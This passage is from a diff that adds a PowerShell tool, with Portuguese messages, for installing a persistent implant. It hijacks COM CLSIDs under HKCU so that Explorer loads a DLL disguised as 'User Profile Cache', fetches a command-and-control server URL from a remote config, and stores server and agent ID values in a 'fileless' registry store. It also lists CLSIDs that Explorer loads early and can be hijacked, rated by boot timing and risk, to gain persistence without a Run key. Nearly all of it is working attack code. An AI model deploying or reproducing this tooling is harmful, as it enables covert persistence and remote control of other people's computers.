+    param([ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto')
+
+    if ($Arch -eq 'x86') { return Join-Path $env:WINDIR 'SysWOW64\mscoree.dll' }
+    return Join-Path $env:WINDIR 'System32\mscoree.dll'
+}
+
+function Get-ComAssemblyMetadata {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path,
+        [string]$ClassName,
+        [string]$AssemblyName
+    )
+
+    $absolutePath = [System.IO.Path]::GetFullPath($Path)
+    if (-not (Test-Path $absolutePath -PathType Leaf)) {
+        throw "DLL não encontrada: $absolutePath"
+    }
+
+    $assembly = [System.Reflection.Assembly]::LoadFile($absolutePath)
+    $assemblyFullName = $assembly.GetName()
+
+    if (-not $AssemblyName) {
+        $publicKeyToken = 'null'
+        $tokenBytes = $assemblyFullName.GetPublicKeyToken()
+        if ($tokenBytes -and $tokenBytes.Length -gt 0) {
+            $publicKeyToken = -join ($tokenBytes | ForEach-Object { $_.ToString('x2') })
+        }
+
+        $AssemblyName = '{0}, Version={1}, Culture=neutral, PublicKeyToken={2}' -f @(
+            $assemblyFullName.Name,
+            $assemblyFullName.Version,
+            $publicKeyToken
+        )
+    }
+
+    if (-not $ClassName) {
+        $comType = $null
+        foreach ($type in $assembly.GetExportedTypes()) {
+            if ($type.IsAbstract -or $type.IsInterface -or -not $type.IsPublic) { continue }
+            $comVisible = $type.GetCustomAttributes([System.Runtime.InteropServices.ComVisibleAttribute], $false)
+            if ($comVisible -and -not $comVisible[0].Value) { continue }
+            $comType = $type
+            break
+        }
+
+        if (-not $comType) {
+            throw "Nenhuma classe COM exportada encontrada em $absolutePath"
+        }
+
+        $ClassName = $comType.FullName
+    }
+
+    return [PSCustomObject]@{
+        DllPath        = $absolutePath
+        AssemblyName   = $AssemblyName
+        ClassName      = $ClassName
+        RuntimeVersion = 'v4.0.30319'
+    }
+}
+
+function Register-ComHijack {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path,
+        [Parameter(Mandatory = $true)][string]$TargetClsid,
+        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto',
+        [string]$ClassName,
+        [string]$AssemblyName,
+        [string]$Description = 'User Profile Cache'
+    )
+
+    $clsid = Format-ComClsid -Value $TargetClsid
+    $metadata = Get-ComAssemblyMetadata -Path $Path -ClassName $ClassName -AssemblyName $AssemblyName
+    $mscoree = Get-MscoreePath -Arch $Arch
+    $codeBase = Format-CodeBaseUri -Path $metadata.DllPath
+
+    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
+    $inprocKey = Join-Path $clsidKey 'InprocServer32'
+
+    New-Item -Path $clsidKey -Force | Out-Null
+    Set-ItemProperty -Path $clsidKey -Name '(default)' -Value $Description
+    New-Item -Path $inprocKey -Force | Out-Null
+    Set-ItemProperty -Path $inprocKey -Name '(default)' -Value $mscoree
+    Set-ItemProperty -Path $inprocKey -Name 'ThreadingModel' -Value 'Both'
+    Set-ItemProperty -Path $inprocKey -Name 'Assembly' -Value $metadata.AssemblyName
+    Set-ItemProperty -Path $inprocKey -Name 'Class' -Value $metadata.ClassName
+    Set-ItemProperty -Path $inprocKey -Name 'RuntimeVersion' -Value $metadata.RuntimeVersion
+    Set-ItemProperty -Path $inprocKey -Name 'CodeBase' -Value $codeBase
+
+    return [PSCustomObject]@{
+        Clsid          = $clsid
+        DllPath        = $metadata.DllPath
+        Mscoree        = $mscoree
+        Assembly       = $metadata.AssemblyName
+        Class          = $metadata.ClassName
+        RuntimeVersion = $metadata.RuntimeVersion
+        CodeBase       = $codeBase
+    }
+}
+
+function Unregister-ComHijack {
+    param(
+        [Parameter(Mandatory = $true)][string]$TargetClsid,
+        [switch]$RemoveProgId
+    )
+
+    $clsid = Format-ComClsid -Value $TargetClsid
+    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
+
+    if (Test-Path $clsidKey) {
+        Remove-Item -Path $clsidKey -Recurse -Force
+    }
+
+    if ($RemoveProgId) {
+        $progIdKey = 'HKCU:\Software\Classes\UserProfileCache.Provider'
+        if (Test-Path $progIdKey) {
+            Remove-Item -Path $progIdKey -Recurse -Force
+        }
+    }
+
+    return $clsid
+}
+
+function Get-RegAsmPath {
+    foreach ($path in @(
+            "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe",
+            "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
+        )) {
+        if (Test-Path $path) { return $path }
+    }
+    throw "RegAsm.exe não encontrado."
+}
+
+function Register-ComHijackViaRegAsm {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path,
+        [string]$TargetClsid
+    )
+
+    $dllPath = [System.IO.Path]::GetFullPath($Path)
+    $regAsm = Get-RegAsmPath
+    $regFile = Join-Path $env:TEMP "UserProfileCache_$(Get-Random).reg"
+    $hkcuRegFile = Join-Path $env:TEMP "UserProfileCache_hkcu_$(Get-Random).reg"
+
+    try {
+        & $regAsm $dllPath /regfile:$regFile /codebase | Out-Null
+        if (-not (Test-Path $regFile)) { throw "RegAsm não gerou o arquivo .reg esperado." }
+
+        $content = Get-Content -Path $regFile -Raw -Encoding Unicode
+        $content = $content -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes'
+        Set-Content -Path $hkcuRegFile -Value $content -Encoding Unicode
+        & reg.exe import $hkcuRegFile | Out-Null
+    }
+    finally {
+        Remove-Item -Path $regFile, $hkcuRegFile -ErrorAction SilentlyContinue
+    }
+
+    if (-not $TargetClsid) {
+        $metadata = Get-ComAssemblyMetadata -Path $dllPath
+        $assembly = [System.Reflection.Assembly]::LoadFile($metadata.DllPath)
+        foreach ($type in $assembly.GetExportedTypes()) {
+            if ($type.GUID -ne [Guid]::Empty) {
+                $TargetClsid = $type.GUID.ToString().ToUpperInvariant()
+                break
+            }
+        }
+    }
+
+    $clsid = Format-ComClsid -Value $TargetClsid
+    $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU não encontrado em $inprocKey" }
+
+    $props = Get-ItemProperty -Path $inprocKey
+    return [PSCustomObject]@{
+        Clsid          = $clsid
+        DllPath        = $dllPath
+        Mscoree        = $props.'(default)'
+        Assembly       = $props.Assembly
+        Class          = $props.Class
+        RuntimeVersion = $props.RuntimeVersion
+        CodeBase       = $props.CodeBase
+    }
+}
+
+function Unregister-ComHijackViaRegAsm {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path,
+        [Parameter(Mandatory = $true)][string]$TargetClsid
+    )
+
+    & (Get-RegAsmPath) ([System.IO.Path]::GetFullPath($Path)) /unregister /codebase | Out-Null
+    Unregister-ComHijack -TargetClsid $TargetClsid -RemoveProgId
+}
+
+#endregion
+
+#region Install helpers
+
+function Test-IsAdmin {
+    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Enable-Tls12 {
+    param([string]$Url)
+    if ($Url -notmatch '^\s*https://') { return }
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+    } catch { }
+}
+
+function Get-ServerUrl {
+    param([string]$Url)
+
+    Enable-Tls12 $Url
+    $raw = (New-Object Net.WebClient).DownloadString($Url)
+    $srv = $null
+
+    if ($PSVersionTable.PSVersion.Major -ge 3) {
+        try {
+            $j = $raw | ConvertFrom-Json
+            if ($j) { $srv = $j.server }
+        } catch { }
+    }
+
+    if (-not $srv -and ($raw -match '"server"\s*:\s*"([^"]+)"')) {
+        $srv = $matches[1]
+    }
+
+    if (-not $srv) { throw "Config missing 'server' key." }
+    return $srv.Trim().TrimEnd('/')
+}
+
+function Get-InstallDllPath {
+    Join-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer') $Script:InstallDllName
+}
+
+function Test-FileInUse {
+    param([Parameter(Mandatory = $true)][string]$Path)
+
+    if (-not (Test-Path $Path -PathType Leaf)) {
+        return $false
+    }
+
+    try {
+        $stream = [System.IO.File]::Open(
+            $Path,
+            [System.IO.FileMode]::Open,
+            [System.IO.FileAccess]::ReadWrite,
+            [System.IO.FileShare]::None)
+        $stream.Close()
+        $stream.Dispose()
+        return $false
+    }
+    catch {
+        return $true
+    }
+}
+
+function Release-ProfileCacheDllLock {
+    param(
+        [Parameter(Mandatory = $true)][string]$DllPath,
+        [string]$Clsid
+    )
+
+    if (-not (Test-FileInUse -Path $DllPath)) {
+        return
+    }
+
+    Write-Host "[*] DLL em uso: $DllPath"
+    Write-Host "[*] A libertar bloqueio (Explorer carrega profilecache.dll via COM hijack)..."
+
+    if ($Clsid) {
+        $clsid = Format-ComClsid -Value $Clsid
+        $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+        if (Test-Path $inprocKey) {
+            Remove-Item -Path $inprocKey -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Host "[*] InprocServer32 removido temporariamente."
+        }
+    }
+
+    $null = taskkill /f /im explorer.exe 2>&1
+    Start-Sleep -Seconds 2
+
+    for ($attempt = 1; $attempt -le 6; $attempt++) {
+        if (-not (Test-FileInUse -Path $DllPath)) {
+            Write-Host "[+] DLL desbloqueada."
+            return
+        }
+
+        Start-Sleep -Seconds 1
+    }
+
+    throw @"
+Nao foi possivel substituir a DLL — ainda em uso por outro processo.
+  $DllPath
+
+Passos manuais:
+  1. .\profile-cache.ps1 -Action Uninstall -Clsid '$Clsid' -RestartExplorer
+  2. Reinicie a sessao Windows, ou
+  3. Execute Install de novo com -RestartExplorer
+"@
+}
+
+function Deploy-InstallDll {
+    param(
+        [Parameter(Mandatory = $true)][string]$SourcePath,
+        [Parameter(Mandatory = $true)][string]$DestinationPath
+    )
+
+    $destDir = Split-Path -Parent $DestinationPath
+    if (-not (Test-Path $destDir)) {
+        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+    }
+
+    Copy-Item -LiteralPath $SourcePath -Destination $DestinationPath -Force
+}
+
+function Sync-FilelessRegistryStore {
+    param(
+        [Parameter(Mandatory = $true)][string]$ConfigUrl,
+        [Parameter(Mandatory = $true)][string]$ServerBase,
+        [Parameter(Mandatory = $true)][string]$AgentId
+    )
+
+    $storeKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
+    New-Item -Path $storeKey -Force | Out-Null
+    Set-ItemProperty -Path $storeKey -Name 'C' -Value $ConfigUrl -Type String
+    Set-ItemProperty -Path $storeKey -Name 'U' -Value $ServerBase -Type String
+    Set-ItemProperty -Path $storeKey -Name 'I' -Value $AgentId -Type String
+    Remove-ItemProperty -Path $storeKey -Name 'T' -ErrorAction SilentlyContinue
+
+    # Chave errada criada por versão anterior (CLSID sem chavetas)
+    $legacyKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"
+    if (Test-Path $legacyKey) {
+        Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Remove-FilelessRegistryStore {
+    $storeKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
+    if (Test-Path $storeKey) {
+        Remove-Item -Path $storeKey -Recurse -Force
+    }
+
+    $legacyKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"
+    if (Test-Path $legacyKey) {
+        Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+#region ListClsid helpers
+
+function Get-ClsidInprocInfo {
+    param([Parameter(Mandatory = $true)][string]$Clsid)
+
+    $formatted = Format-ComClsid -Value $Clsid
+    $key = "HKLM:\Software\Classes\CLSID\$formatted\InprocServer32"
+    if (-not (Test-Path $key)) {
+        return [PSCustomObject]@{
+            Clsid   = $formatted
+            Dll     = $null
+            Missing = $true
+        }
+    }
+
+    $props = Get-ItemProperty -Path $key
+    return [PSCustomObject]@{
+        Clsid   = $formatted
+        Dll     = $props.'(default)'
+        Missing = $false
+    }
+}
+
+function Get-RegistryClsidCandidates {
+    param(
+        [Parameter(Mandatory = $true)][string]$Category,
+        [Parameter(Mandatory = $true)][string]$RegistryPath,
+        [Parameter(Mandatory = $true)][string]$BootTiming,
+        [Parameter(Mandatory = $true)][string]$Risk,
+        [Parameter(Mandatory = $true)][string]$Compat
+    )
+
+    if (-not (Test-Path $RegistryPath)) {
+        return @()
+    }
+
+    $rows = @()
+    Get-ChildItem -Path $RegistryPath -ErrorAction SilentlyContinue | ForEach-Object {
+        $name = $_.PSChildName
+        $clsid = (Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue).'(default)'
+        if (-not $clsid) { return }
+
+        $info = Get-ClsidInprocInfo -Clsid $clsid
+        $rows += [PSCustomObject]@{
+            Category   = $Category
+            Name       = $name
+            Clsid      = $info.Clsid
+            Dll        = $info.Dll
+            BootTiming = $BootTiming
+            Risk       = $Risk
+            Compatible = $Compat
+        }
+    }
+
+    return $rows
+}
+
+function Invoke-ListClsidAction {
+    Write-Host "[*] CLSIDs candidatos para hijack COM (HKLM -> escolhe um para -Clsid no Install)"
+    Write-Host "[*] CacheProvider implementa IShellIconOverlayIdentifier — overlays sao os mais seguros."
+    Write-Host ""
+
+    $roots = @(
+        @{
+            Category = 'ShellServiceObject'
+            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
+            Boot     = 'Explorer boot (alta)'
+            Risk     = 'Medio'
+            Compat   = 'Sim (IShellService + O)'
+        },
+        @{
+            Category = 'ShellServiceObject'
+            Path     = 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
+            Boot     = 'Explorer boot (alta)'
+            Risk     = 'Medio'
+            Compat   = 'Sim (IShellService + O)'
+        },
+        @{
+            Category = 'ShellIconOverlay'
+            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers'
+            Boot     = 'Ao abrir pastas (baixa)'
+            Risk     = 'Baixo'
+            Compat   = 'Sim'
+        },
+        @{
+            Category = 'ShellIconOverlay'
+            Path     = 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers'
+            Boot     = 'Ao abrir pastas (baixa)'
+            Risk     = 'Baixo'
+            Compat   = 'Sim'
+        },
+        @{
+            Category = 'DesktopNamespace'
+            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace'
+            Boot     = 'Explorer boot (alta)'
+            Risk     = 'Alto'
+            Compat   = 'Requer IShellFolder (nao implementado)'
+        },
+        @{
+            Category = 'MyComputerNamespace'
+            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace'
+            Boot     = 'Explorer boot (media)'
+            Risk     = 'Alto'
+            Compat   = 'Requer IShellFolder (nao implementado)'
+        }
+    )
+
+    $all = @()
+    foreach ($root in $roots) {
+        $all += Get-RegistryClsidCandidates `
+            -Category $root.Category `
+            -RegistryPath $root.Path `
+            -BootTiming $root.Boot `
+            -Risk $root.Risk `
+            -Compat $root.Compat
+    }
+
+    if (-not $all -or $all.Count -eq 0) {
+        Write-Warning "Nenhum candidato encontrado nesta maquina."
+        return
+    }
+
+    $all | Sort-Object BootTiming, Category, Name | Format-Table -AutoSize Category, Name, Clsid, BootTiming, Risk, Compatible, Dll
+
+    Write-Host ""
+    Write-Host "Recomendacao para boot sem Run key:"
+    Write-Host "  1. Procmon no login: Process=explorer.exe, Operation=Load Image/RegOpenKey, filtrar CLSID"
+    Write-Host "  2. Priorizar ShellServiceObjects (carregam cedo) — exige stub extra no bootstrap"
+    Write-Host "  3. Overlays (OneDrive*) sao compativeis hoje mas disparam ao navegar pastas"
+    Write-Host ""
+    Write-Host "Teste rapido: [Activator]::CreateInstance([Type]::GetTypeFromCLSID('{GUID}'))"
+    Write-Host "Install:       .\profile-cache.ps1 -Action Install -Config '...' -Clsid '{GUID}' -RestartExplorer"
+}
+
+#endregion
+
+function Save-OriginalInprocDll {
+    param(
+        [Parameter(Mandatory = $true)][string]$Clsid,
+        [Parameter(Mandatory = $true)][string]$HkcuClsidKey
+    )
+
+    $hklmInproc = "HKLM:\Software\Classes\CLSID\$Clsid\InprocServer32"
+    if (-not (Test-Path $hklmInproc)) {
+        Write-Warning "HKLM InprocServer32 não encontrado para $Clsid — valor O (proxy) omitido."
+        return $null
+    }
+
+    $orig = (Get-ItemProperty -Path $hklmInproc).'(default)'
+    if ([string]::IsNullOrWhiteSpace($orig)) {
+        Write-Warning "DLL original vazia em HKLM para $Clsid."
+        return $null
+    }
+
+    Set-ItemProperty -Path $HkcuClsidKey -Name 'O' -Value $orig -Type String
+    Write-Host "[+] Proxy O (DLL original): $orig"
+    return $orig
+}
+
+function Invoke-InstallAction {
+    if (-not $Config) { throw "Install requer -Config." }
+    if (-not $Clsid) { throw "Install requer -Clsid." }
+
+    if (Test-IsAdmin) {
+        Write-Warning "Executando como admin. Destinado a user-mode (HKCU hijack)."
+    }
+
+    Write-Host "[*] Obtendo server URL de $Config..."
+    $serverBase = Get-ServerUrl -Url $Config
+    Write-Host "[+] Server: $serverBase"
+
+    $destDll = Get-InstallDllPath
+    $installDir = Split-Path -Parent $destDll
+    if (-not (Test-Path $installDir)) {
+        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+    }
+
+    Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
+
+    if ($SourceDll) {
+        if (-not (Test-Path $SourceDll -PathType Leaf)) {
+            throw "SourceDll não encontrada: $SourceDll"
+        }
+
+        Write-Host "[*] Usando DLL pré-compilada (-SourceDll) -> $destDll"
+        Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
+    }
+    else {
+        Write-Host "[*] Compilando bootstrap em $destDll ..."
+        Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
+        Write-Host "[+] Bootstrap compilada."
+    }
+
+    Write-Host "[*] Registrando COM hijack em HKCU..."
+    $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
+
+    $agentId = [guid]::NewGuid().ToString('N')
+    $clsidKey = "HKCU:\Software\Classes\CLSID\$($result.Clsid)"
+
+    Write-Host "[*] Gravando config (C, U, I) em $clsidKey..."
+    Set-ItemProperty -Path $clsidKey -Name 'C' -Value $Config -Type String
+    Set-ItemProperty -Path $clsidKey -Name 'U' -Value $serverBase -Type String
+    Set-ItemProperty -Path $clsidKey -Name 'I' -Value $agentId -Type String
+
+    Write-Host "[*] Gravando proxy O (DLL original HKLM)..."
+    $origDll = Save-OriginalInprocDll -Clsid $result.Clsid -HkcuClsidKey $clsidKey
+
+    Write-Host "[*] Espelhando config fileless (C, U, I, T) em HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)..."
+    Sync-FilelessRegistryStore -ConfigUrl $Config -ServerBase $serverBase -AgentId $agentId
+
+    Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
+
+    Write-Host "[+] Instalação concluída"
+    Write-Host "    CLSID:    $($result.Clsid)"
+    Write-Host "    Store:    $($Script:FilelessStoreClsid)"
+    Write-Host "    DLL:      $destDll"
+    Write-Host "    Config:   $Config"
+    Write-Host "    Server:   $serverBase"
+    Write-Host "    Agent ID: $agentId"
+    if ($origDll) { Write-Host "    Proxy O:  $origDll" }
+
+    if ($RestartExplorer) {
+        Write-Host "[*] Reiniciando Explorer..."
+        taskkill /f /im explorer.exe 2>$null | Out-Null
+        Start-Sleep -Seconds 1
+        Start-Process explorer.exe
+        Write-Host "[+] Explorer reiniciado."
+    }
+
+    Write-Host ""
+    Write-Host "Teste: [Activator]::CreateInstance([Type]::GetTypeFromCLSID('$($result.Clsid)'))"
+}
+
+function Invoke-UninstallAction {
+    if (-not $Clsid) { throw "Uninstall requer -Clsid." }
+
+    Write-Host "[*] Removendo registro COM hijack..."
+    $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
+    Write-Host "[+] Chave removida: HKCU:\Software\Classes\CLSID\$removed"
+
+    Write-Host "[*] Removendo fileless store..."
+    Remove-FilelessRegistryStore
+    Write-Host "[+] Fileless store removido: HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
+
+    if ($RemoveDll) {
+        $destDll = Get-InstallDllPath
+        Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
+        if (Test-Path $destDll) {
+            Remove-Item -LiteralPath $destDll -Force
+            Write-Host "[+] DLL removida: $destDll"
+        }
+    }
+
+    if ($RestartExplorer) {
+        Write-Host "[*] Reiniciando Explorer..."
+        $null = taskkill /f /im explorer.exe 2>&1
+        Start-Sleep -Seconds 1
+        Start-Process explorer.exe
+        Write-Host "[+] Explorer reiniciado."
+    }
+
+    if (Test-Path $Script:StateFile) {
+        Remove-Item -Path $Script:StateFile -Force -ErrorAction SilentlyContinue
+    }
+
+    Write-Host "[+] Desinstalação concluída."
+}
+
+function Invoke-RegisterAction {
+    if (-not $Clsid) { throw "Register requer -Clsid." }
+
+    $targetDll = $DllPath
+    if (-not $targetDll) { $targetDll = Get-InstallDllPath }
+    if (-not (Test-Path $targetDll -PathType Leaf)) {
+        throw "DLL não encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
+    }
+
+    if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
+        $previous = (Get-Content -Path $Script:StateFile -Raw).Trim()
+        if ($previous) {
+            Write-Host "[*] Removendo CLSID anterior: $previous"
+            Unregister-ComHijack -TargetClsid $previous -RemoveProgId | Out-Null
+        }
+    }
+
+    if ($UseRegAsm) {
+        Write-Host "[*] Registrando via RegAsm..."
+        $result = Register-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
+    }
+    else {
+        Write-Host "[*] Registrando diretamente em HKCU..."
+        $result = Register-ComHijack -Path $targetDll -TargetClsid $Clsid -Arch $Architecture
+    }
+
+    Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
+
+    Write-Host "[+] Registro concluído"
+    Write-Host "    CLSID:    $($result.Clsid)"
+    Write-Host "    DLL:      $($result.DllPath)"
+    Write-Host "    CodeBase: $($result.CodeBase)"
+    Write-Host ""
+    Write-Host "Teste: [Activator]::CreateInstance([Type]::GetTypeFromCLSID('$($result.Clsid)'))"
+}
+
+function Invoke-UnregisterAction {
+    if (-not $Clsid) { throw "Unregister requer -Clsid." }
+
+    if ($UseRegAsm) {
+        $targetDll = $DllPath
+        if (-not $targetDll) { $targetDll = Get-InstallDllPath }
+        if (-not (Test-Path $targetDll -PathType Leaf)) {
+            throw "Unregister com -UseRegAsm requer -DllPath válido."
+        }
+
+        Write-Host "[*] Desregistrando via RegAsm..."
+        $removed = Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
+    }
+    else {
+        Write-Host "[*] Removendo chaves HKCU..."
+        $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
+    }
+
+    Write-Host "[+] Desregistro concluído para CLSID $removed"
+}
+
+#endregion
+
+switch ($Action) {
+    'Install'    { Invoke-InstallAction }
+    'Uninstall'  { Invoke-UninstallAction }
+    'Register'   { Invoke-RegisterAction }
+    'Unregister' { Invoke-UnregisterAction }
+    'ListClsid'  { Invoke-ListClsidAction }
+}
